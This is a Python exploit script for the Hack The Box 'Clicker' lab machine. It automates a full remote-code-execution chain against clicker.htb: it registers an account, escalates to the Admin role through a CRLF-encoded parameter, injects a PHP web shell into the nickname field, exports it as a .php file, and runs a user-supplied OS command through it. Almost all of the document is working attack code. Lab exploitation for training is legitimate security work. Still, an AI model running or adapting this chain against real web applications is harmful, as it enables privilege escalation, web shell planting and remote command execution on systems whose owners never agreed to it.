#!/usr/bin/env python3

'''
HTB Clicker (RCE)
-----------------
Description: CRLF to get the administrator role and inject PHP code into the "nickname" variable to execute code
Author: Marss
Date: 24 Oct, 2023
Repository: https://github.com/E1P0TR0
'''

from argparse import ArgumentParser, RawDescriptionHelpFormatter
from random import choices
from re import findall
from requests import Session
from requests.exceptions import ConnectionError, ConnectTimeout, ReadTimeout
from signal import signal, SIGINT
from string import ascii_letters
from sys import argv
from urllib.parse import quote

# Ctrl + c
signal(SIGINT, lambda signum, frame: exit('\n[!] User aborted.'))

# Main class
class Exploit:

    get_rand_str = lambda self, length: ''.join(choices(ascii_letters, k=length))
    
    def __init__(self, args):
        
        self.command = args.command
        self.target = {'base_url':'http://clicker.htb'}
        self.temp_data = self.get_rand_str(5)

        # Session
        self.session = Session()

    def run(self):

        if self.target_response():
            self.register()
            self.load_profile()
            self.update_profile()
            self.load_profile()
            self.create_php_file()
            self.execute_command()

    def target_response(self) -> bool:

        try:
            response = self.session.get(self.target['base_url'], timeout=5)

            if response.ok:
                print('\n[+] Target up.')
            
            return response.ok

        except ConnectTimeout:
            exit('\n[!] Verify VPN connection.')
        except ConnectionError:
            exit(f'\n[x] Can\'t resolve {self.target["base_url"]}')

    def register(self):

        try:
            post_data = {
                'username': self.temp_data,
                'password': self.temp_data
            }

            response = self.session.post(self.target['base_url'] + '/create_player.php',
                data=post_data,
                allow_redirects=False)

            if not 'Successfully registered' in response.headers['Location']:
                exit('\n[x] Something went wrong.')
            
            print('[*] Credentials: {0}:{0}'.format(self.temp_data))

        except Exception as error:
            exit('\n[x] Error: ' + repr(error))

    def load_profile(self):
        
        try:
            post_data = {
                'username': self.temp_data,
                'password': self.temp_data
            }

            response = self.session.post(self.target['base_url'] + '/authenticate.php',
                data=post_data,
                allow_redirects=False)

            if 'Authentication Failed' in response.headers['Location']:
                exit('\n[x] Something went wrong.')
            
            print('[*] Updated data.')

        except Exception as error:
            exit('\n[x] Error: ' + repr(error))

    def update_profile(self):

        try:
            request_data = '&'.join(
                ('clicks=1',
                'level=1',
                'role%0D%0A=Admin',
                'nickname=<?php system($_GET["cmd"]); ?>'))
            
            response = self.session.get(self.target['base_url'] + '/save_game.php',
                params=request_data,
                allow_redirects=False)
            
            if not 'Game has been saved!' in response.headers['Location']:
                exit('\n[x] Something went wrong.')
            
            print('[*] The Admin role was assigned and the php code was injected.')

        except Exception as error:
            exit('\n[x] Error: ' + repr(error))
    
    def create_php_file(self):

        try:
            post_data = {
                'threshold': 1000000,
                'extension': 'php'
            }

            response = self.session.post(self.target['base_url'] + '/export.php',
                data=post_data,
                allow_redirects=False)

            msg_response = response.headers['Location']

            if not 'Data has been saved' in msg_response:
                exit('\n[x] Something went wrong.')

            self.php_file = msg_response.split('/')[-1]

        except Exception as error:
            exit('\n[x] Error: ' + repr(error))

    def execute_command(self):

        try:
            
            request_data = 'cmd=' + quote(self.command)

            response = self.session.get(self.target['base_url'] + f'/exports/{self.php_file}',
                params=request_data)

            if response.status_code != 200:
                exit('\n[x] Something went wrong.')

            print()
            output = findall(r'<th scope="row">((?:.*\n)+)', response.text)[0]
            print(f'{output}')

        except ReadTimeout:
            exit('\n[x] Something went wrong.')
        except Exception as error:
            exit('\n[x] Error: ' + repr(error))

# Main flow
if __name__ == '__main__':

    title = '\n| HTB Clicker (CRLF && Code injection && RCE) |'

    parser = ArgumentParser(
        formatter_class=RawDescriptionHelpFormatter,
        epilog=f'''Example:
        python3 {argv[0]} -c 'id'
        ''')

    parser.add_argument('-c',
        dest='command',
        type=str,
        required=True,
        help='Command to execute')

    args = parser.parse_args()

    print(title)

    exploit = Exploit(args)
    exploit.run()